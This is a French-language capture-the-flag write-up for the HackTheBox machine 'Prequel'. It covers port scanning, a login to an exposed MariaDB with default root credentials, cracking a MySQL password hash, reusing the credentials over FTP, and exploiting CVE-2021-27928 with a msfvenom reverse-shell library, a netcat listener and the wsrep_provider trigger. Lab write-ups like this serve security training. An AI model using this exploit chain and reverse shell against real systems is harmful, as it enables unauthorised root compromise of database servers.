# Rapport de pentest — HTB « Prequel » (Very Easy)

**Cible :** `10.10.x.x` · **Objectif :** compromission complète (user + root)
**Vecteur principal :** réutilisation de credentials + CVE-2021-27928 (MariaDB RCE)

## 1. Reconnaissance

Scan de ports initial (`nmap -sC -sV -p-`) :

| Port | Service | Note |
|------|---------|------|
| 21/tcp | FTP | vecteur de dépôt de fichier |
| 22/tcp | SSH | accès potentiel post-creds |
| 80/tcp | HTTP | web root accessible → pivot |
| 3306/tcp | MySQL/MariaDB | **exposé publiquement = anomalie** |

> **Pourquoi c'est intéressant :** un MariaDB exposé sur Internet, c'est déjà une faute de conf. S'il accepte en plus des creds faibles, c'est game over.

## 2. Accès initial — base de données

Connexion avec des credentials triviaux (`root:root`), en forçant le downgrade TLS :

```bash
mysql -h <IP> -u root -proot --ssl=0
```

Extraction du hash applicatif :

```sql
USE ftpd;
SELECT * FROM users;
-- developer | *5F76CCB4AC484BC82CB4E1A903F10DD76EB4B13E
```

> Le `*` + 40 hex = hash **MySQL native** (`SHA1(SHA1(password))`). John le reconnaît en auto.

Crack :

```bash
john --format=mysql-sha1 --wordlist=rockyou.txt hash.txt
# developer : treehouse
```

## 3. Pivot — réutilisation de credentials

Les creds `developer:treehouse` fonctionnent aussi en **FTP** (classique : un seul mot de passe partout).

```bash
ftp <IP>   # developer / treehouse
```

Le répertoire FTP correspond au **web root** → on peut y déposer un fichier arbitraire.

## 4. Exploitation — CVE-2021-27928 (MariaDB RCE)

**Version vulnérable :** MariaDB `10.3.27`.
**Principe :** la variable globale `wsrep_provider` (bibliothèque Galera) accepte un chemin arbitraire. En la pointant vers un `.so` malveillant, le constructeur de la lib s'exécute **dans le process `mysqld`** → RCE. Comme `mysqld` tourne souvent en root, c'est une élévation directe.

Génération du payload :

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -f elf-so -o CVE-2021-27928.so
```

Dépôt via FTP dans le web root :

```bash
ftp> cd html
ftp> put CVE-2021-27928.so
```

Listener en écoute :

```bash
nc -lvnp 4444
```

Déclenchement depuis MariaDB :

```sql
SET GLOBAL wsrep_provider='/var/www/html/CVE-2021-27928.so';
```

→ Shell reçu. Stabilisation :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# puis : Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
```
